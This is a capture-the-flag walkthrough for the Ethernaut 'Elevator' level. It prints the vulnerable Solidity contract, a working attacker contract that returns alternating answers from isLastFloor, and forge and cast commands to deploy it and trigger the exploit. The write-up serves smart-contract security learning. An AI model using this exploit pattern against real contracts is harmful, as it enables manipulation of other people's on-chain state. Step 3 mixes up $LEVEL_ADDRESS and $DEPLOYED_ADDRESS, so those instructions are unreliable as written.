## Elevator Level Outline

**Difficulty : 4/10**

This elevator won't let you reach the top of your building. Right?

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0xaB4F3F2644060b2D960b0d88F0a42d1D27484687)

## Solution

We can create a 'switch' variable that can be flipped after every function call effectively returning a different value on every call.

### Walkthrough

##### 1. create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Building {
    Elevator elevator;
    bool isTopFloor = false;

    constructor(address _elevator) {
       elevator = Elevator(_elevator); 
    }

    function attack() public {
        elevator.goTo(42);
    }
     
    function isLastFloor(uint _floor) external returns (bool) {
        bool tempSwtich = isTopFloor; 
        isTopFloor = !isTopFloor;
        return tempSwtich;
    }
}

interface Elevator {
    function goTo(uint _foor) external;
}
```

##### 2. deploy our new contract
```console
forge create src/Contract.sol:Building --constructor-args $LEVEL_ADDRESS --private-key $PRIVATE_KEY 
```

##### 3. call our newly deployed contract 
```console
cast send $LEVEL_ADDRESS "attack()" --gas 300000 --private-key $PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

##### 4. quick confirmation that boolean top has been changed
```console
cast call $LEVEL_ADDRESS "top()"
```
output 
```
0x0000000000000000000000000000000000000000000000000000000000000001
```
> variable top has changed form false to true

## Extra Resources
`public` and `private` are **visibility modifiers**

`pure` and `view` are **state modifiers**

- `pure`: promises functions that will neither read from nor modify the state. Note: Pure replaces constant in more recent compilers.
- `view`: promises functions that will only read, but not modify the state
- `default`: [no modifier] promises functions that will read and modify the the state

You can use the **view function modifier** on an interface in order to prevent state modifications. The **pure function modifier** also prevents functions from modifying the state. 

Read more about state modifiers [here](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions)
